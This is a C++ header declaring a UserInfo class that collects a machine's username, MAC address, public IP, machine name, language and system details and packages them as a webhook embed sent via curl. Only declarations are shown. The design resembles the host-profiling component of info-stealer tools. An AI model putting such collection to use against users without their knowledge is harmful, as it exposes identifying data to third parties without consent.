#pragma once
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>

#pragma comment(lib, "IPHLPAPI.lib")

#include <curl/curl.h>
#include "json/json.hpp"
#include "utils.h"
#include "webhook.h"


using json = nlohmann::json;

class UserInfo {
public:
	UserInfo();
	WebhookEmbed Build();

private:
	WebhookEmbed embed;

	void AddUsername();
	void AddMAC();
	void AddPublicIP();
	void AddTime();
	void AddMachineName();
	void AddLang();
	void AddSystemInfo();
};

static size_t CurlWriteCallback(void* contents, size_t size, size_t nmemb, std::string* response);